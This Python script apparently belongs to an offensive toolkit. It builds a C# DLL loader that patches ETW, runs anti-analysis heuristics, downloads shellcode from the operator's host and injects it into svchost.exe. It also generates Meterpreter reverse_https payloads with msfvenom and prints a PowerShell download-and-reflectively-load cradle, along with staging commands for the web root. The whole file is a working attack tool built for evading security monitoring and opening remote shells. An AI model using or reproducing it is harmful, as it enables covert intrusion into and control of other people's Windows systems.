#!/bin/env python3
import ak
import os
import subprocess

BASE_FILENAME = 'win_ps_dll_runner'
FN_CS = BASE_FILENAME + '.cs'
FN_SHELLCODE = BASE_FILENAME + ".sc"

#ENCODER="x64/xor_dynamic"
#ENCODER="x64/zutto_dekiru"
ENCODER="generic/none"
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e {ENCODER}"
MSFVENOM32_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e {ENCODER}"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x00'
WEBROOT = "/var/www/html"
SHELLCODE_PATH = "/sc"
SHELLCODE32_PATH = "/sc32"
STAGER_URL = f"http://{ak.LHOST}/sc"

def generate():
  svchost_path = ak.Obfuscator(SVCHOST_PATH)

  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Class1
    {{
        {ak.START_PROCESS_INJECT_IMPORT}
        {ak.HEURISTICS_IMPORT}
        {ak.ARCH_DETECTION}
        {ak.ETW_FUNCS}

        public static void ferrari()
        {{
            {ak.HEURISTICS_CODE}
            {ak.ETW_PATCH}
            {URL_DL_CODE}

         {ak.START_PROCESS_INJECT}

        }}
    }}
}}
""".format(ak=ak,
           URL_DL_CODE=url_dl_code)

  ak.write_file(FN_CS, template)

def generate_shellcode():
  shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
  shellcode32 = ak.ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)

  ak.write_file(FN_SHELLCODE, shellcode.get_bytes())
  ak.write_file(FN_SHELLCODE + "32", shellcode32.get_bytes())

def main():
  generate()
  ak.cs_compile(FN_CS, '/target:library')
  generate_shellcode()

  print("Load with:")
  ps = """
$data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
$assem = [System.Reflection.Assembly]::Load($data)

$class = $assem.GetType('LeMans.Class1')
$method = $class.GetMethod("ferrari")
$method.Invoke(0, $null)
""".format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
  print(ps)

  print("Run the following:")
  print("cp " + BASE_FILENAME + '.dll ' + WEBROOT + "/" + BASE_FILENAME + '.dll')
  print("cp " + BASE_FILENAME + ".sc " + WEBROOT + SHELLCODE_PATH)
  print("cp " + BASE_FILENAME + ".sc32 " + WEBROOT + SHELLCODE32_PATH)

if __name__ == "__main__":
  main()
